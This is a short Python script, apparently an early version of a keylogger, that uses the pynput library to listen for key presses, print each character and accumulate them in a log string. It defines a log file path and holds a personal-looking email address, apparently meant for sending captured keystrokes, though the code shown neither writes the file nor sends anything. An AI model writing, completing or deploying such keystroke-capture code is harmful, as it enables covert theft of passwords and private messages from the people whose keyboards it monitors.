import os
from pynput import keyboard


# define the path of log file.
path = os.getcwd()
log_file = path + '/log'

"""
Class that processes some basic functions of a keylogger.
Keyboard functions referenced from
https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard.
"""
class Keylogger:
    def __init__(self, email):
        self.log_file = log_file
        self.email = email
        self.log = ''

    def get_key(self, key):
        try:
            getKey = str(key.char)
            print(getKey)
        except AttributeError:
            getKey = ''

        self.append_log(getKey)

    def append_log(self, newmsg):
        self.log += newmsg

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.get_key)
        with keyboard_listener:
            keyboard_listener.join()



kl = Keylogger('295064001@qq.com')
kl.start()